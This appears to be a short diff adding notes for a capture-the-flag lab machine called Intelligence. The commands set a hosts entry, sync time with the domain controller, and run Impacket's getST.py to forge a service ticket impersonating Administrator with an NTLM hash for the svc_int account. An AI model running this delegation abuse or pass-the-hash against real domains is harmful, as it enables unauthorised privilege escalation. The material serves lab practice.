@@ -1,0 +1,4 @@
+echo "10.10.10.248 intelligence.htb" | sudo tee -a /etc/hosts
+sudo ntpdate -s 10.10.10.248
+getST.py -spn WWW/dc.intelligence.htb -impersonate Administrator
+intelligence.htb/svc_int -hashes :80c1d736d9988b5763b9aa74362db287
